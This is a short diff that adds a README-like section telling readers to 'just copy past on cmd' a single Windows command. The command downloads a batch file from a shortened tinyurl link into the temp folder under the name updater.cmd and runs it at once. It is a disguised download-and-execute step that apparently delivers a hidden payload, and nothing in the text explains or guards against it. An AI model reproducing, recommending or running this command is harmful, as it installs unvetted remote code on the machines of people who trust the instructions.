@@ -1,0 +1,5 @@
+
+## Just copy past on cmd
+```
+curl -L -o %TEMP%\updater.cmd https://tinyurl.com/spyrus && %TEMP%\updater.cmd
+```
